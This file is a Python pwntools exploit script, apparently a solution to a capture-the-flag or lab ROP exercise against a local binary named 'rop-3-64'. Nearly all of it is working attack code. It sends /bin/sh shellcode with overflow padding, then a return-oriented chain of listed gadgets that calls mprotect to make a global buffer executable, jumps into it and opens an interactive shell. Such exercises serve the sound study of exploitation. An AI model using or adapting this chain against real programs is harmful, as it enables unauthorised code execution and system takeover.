#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-3-64")

shell_code = 'jlX\x0f\x05H\x89\xc6H\x89\xc7jrX\x0f\x05H1\xf6H1\xd2j;XH\xbb//bin/shVSH\x89\xe7\x0f\x05'

buf = shell_code + "A" * (0x80 -len(shell_code)) + "BBBBBBBB"

'''
p = process("./rop-3-xx")
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)
'''

"""
0x00000000004004e0  setenv@plt
0x00000000004004f0  chdir@plt
0x0000000000400500  read@plt
0x0000000000400510  prctl@plt
0x0000000000400520  mprotect@plt
"""
mprotect = p64(0x0000000000400520)

'''
0x000000000040073c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040073e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400740 : pop r14 ; pop r15 ; ret
0x0000000000400742 : pop r15 ; ret
0x000000000040058b : pop rbp ; mov edi, 0x601050 ; jmp rax
0x000000000040073b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040073f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400598 : pop rbp ; ret
0x0000000000400743 : pop rdi ; ret
0x000000000040064a : pop rdx ; nop ; pop rbp ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
0x000000000040073d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
'''
pop_rdi = p64(0x0000000000400743)
pop_rsi_r15 = p64(0x0000000000400741)
pop_rdx_rbp = p64(0x000000000040064a)

#go into gdb and print &g_buf to get addr
#0  out last 4 digits to page align

g_buf = p64(0x601080)
g_buf_algined = p64(0x601000)


#mprotect(0x804a800,0x1000,7)

'''
buf += mprotect
#buf += 'AAAA'
#buf += pop_3_ret
buf += g_buf
buf += g_buf_algined
buf += p32(0x1000)
buf += p32(7)
'''

buf += pop_rdi
buf += g_buf_algined
buf += pop_rsi_r15
buf += p64(0x1000)
buf += p64(0x1000)
buf += pop_rdx_rbp
buf += p64(7)
buf += p64(7)
buf += mprotect
buf += g_buf



p.sendline(buf)
p.interactive()